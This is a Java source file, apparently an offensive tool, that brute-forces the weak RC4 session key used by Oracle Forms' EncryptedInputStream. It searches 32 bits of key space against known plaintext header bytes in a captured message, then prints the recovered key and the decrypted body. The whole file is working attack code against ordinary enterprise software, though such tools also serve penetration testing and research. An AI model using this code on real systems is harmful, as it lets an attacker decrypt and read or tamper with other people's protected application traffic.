import java.io.*;
import oracle.forms.engine.FormsMessage;
import oracle.forms.engine.Message;
import oracle.forms.net.EncryptedInputStream;
import java.util.Arrays;

/* http://stackoverflow.com/a/21341389 */
class KPM {
    /**
     * Search the data byte array for the first occurrence of the byte array pattern within given boundaries.
     * @param data
     * @param start First index in data
     * @param stop Last index in data so that stop-start = length
     * @param pattern What is being searched. '*' can be used as wildcard for "ANY character"
     * @return
     */
    public static int indexOf( byte[] data, int start, int stop, byte[] pattern) {
        if( data == null || pattern == null) return -1;

        int[] failure = computeFailure(pattern);

        int j = 0;

        for( int i = start; i < stop; i++) {
            while (j > 0 && ( pattern[j] != '*' && pattern[j] != data[i])) {
                j = failure[j - 1];
            }
            if (pattern[j] == '*' || pattern[j] == data[i]) {
                j++;
            }
            if (j == pattern.length) {
                return i - pattern.length + 1;
            }
        }
        return -1;
    }

    /**
     * Computes the failure function using a boot-strapping process,
     * where the pattern is matched against itself.
     */
    private static int[] computeFailure(byte[] pattern) {
        int[] failure = new int[pattern.length];

        int j = 0;
        for (int i = 1; i < pattern.length; i++) {
            while (j>0 && pattern[j] != pattern[i]) {
                j = failure[j - 1];
            }
            if (pattern[j] == pattern[i]) {
                j++;
            }
            failure[i] = j;
        }

        return failure;
    }
}


class OracleFormsSyncingBruteForce{


    // Borrowed from https://stackoverflow.com/questions/140131/convert-a-string-representation-of-a-hex-dump-to-a-byte-array-using-java
    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                                 + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }

    public static String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
            sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }

    private static void printMessage(Message m){
        for (int i=0;i<m.size();i++){
            System.out.println("Property "+i+": "+m.getPropertyAt(i)+" Type: "+m.getPropertyTypeAt(i));
            System.out.println("--- Value: "+m.getValueAt(i).toString());
            System.out.flush();
        }
    }

    public static void main(String argv[]){
    	String bodyHex=argv[0];
        int searchLength=Integer.parseInt(argv[1]);
        System.out.println(bodyHex);
        
        byte[] keyStreamDummy=new byte[searchLength];
        byte[] keyStream=new byte[searchLength];
        Arrays.fill(keyStreamDummy,(byte)0);
        
        byte[] body=hexStringToByteArray(bodyHex);
        System.out.println("Body: "+body.length+" byte(s)");
        
        byte[] header=new byte[3];
        header[0]=(byte)(body[0]^((byte)0x10));
        header[1]=body[1];
        header[2]=(byte)(body[2]^((byte)0x06));


        if (body.length==0) return;
        byte[] rc4Key=new byte[5];

        for(long l=0x30000000L;l<0xffffffffL;l++){
            rc4Key[0]=(byte)((l & 0xff000000) >> 24);        
            rc4Key[1]=(byte)((l & 0xff0000) >> 16);        
            rc4Key[2]=-82;        
            rc4Key[3]=(byte)((l & 0xff00) >> 8);
            rc4Key[4]=(byte)(l & 0xff);
            /*if (l % 10000 == 0)
              System.out.println("Trying: "+byteArrayToHex(rc4Key));*/
            EncryptedInputStream eisKS=new EncryptedInputStream(new ByteArrayInputStream(keyStreamDummy));
            eisKS.setEncryptKey(rc4Key);

            try{
                eisKS.read(keyStream,0,searchLength);
                int index=KPM.indexOf(keyStream,0,keyStream.length,header);
                if (index!=-1){        
                    //System.out.println(String.format("Found candidate: %08x (%d)",l,index));
                    ByteArrayOutputStream baos=new ByteArrayOutputStream();
                    baos.write(new byte[index]);
                    baos.write(body);
                    EncryptedInputStream eis=new EncryptedInputStream(new ByteArrayInputStream(baos.toByteArray()));
                    eis.setEncryptKey(rc4Key);
                    byte[] res=new byte[body.length+index];
                    eis.read(res,0,body.length+index);
                    if (res[index]==0x10 && res[index+1]==0x00 && res[res.length-1]==0x01 && res[res.length-2]==-16){
                        System.out.println("KEY FOUND: "+byteArrayToHex(rc4Key));    
                        System.out.println(byteArrayToHex(res));
                        return;
                    }
                }
            }catch(IOException ioe){
                System.out.println("IOException");    
                return;
            }

        }
    }
}
